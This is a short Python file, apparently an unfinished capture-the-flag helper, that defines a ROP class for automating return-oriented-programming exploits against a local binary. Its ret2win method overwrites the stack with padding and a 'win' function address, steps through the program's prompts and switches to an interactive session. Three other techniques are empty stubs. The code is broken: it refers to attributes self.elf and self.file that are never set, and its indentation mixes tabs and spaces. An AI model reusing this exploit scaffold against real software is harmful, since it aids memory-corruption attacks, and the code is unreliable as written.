
class ROP:
    def __init__(self, filename, properties):
        self.filename = filename
        self.properties = properties

    # Smash stack and change return address to win()
    def ret2win(self, vuln_input, padding):
		# Craft the exploit
        self.exploit = b'a'*padding + p64(self.elf.sym['win'])
        self.send_rop(vuln_input)

    def ret2system(self):
        pass

    def ret2execve(self):
        pass

    def ret2syscall(self):
        pass

    def supporting_functions_here(self):
        print("example support function")

    # send_rop()?
    def send_rop(self, vuln_input):
        curr_input = 1
        p = process(self.file)
		# Step through program and wait for vulnerable input
        while p.poll() == None:
            if p.can_recv(timeout=1):
                try:
                    p.recv()
                except EOFError:
                    return
            else:
				# Send exploit and switch to interactive
                if curr_input == vuln_input:
                    p.sendline(self.exploit)
                    p.interactive()
                    try:
                        p.close()
                        p.kill()
                    except:
                        return
                    return
                else:
                    p.sendline(b'a')
                    curr_input += 1
		# In case, close and kill the process
        try:
            p.close()
            p.kill()
        except:
            return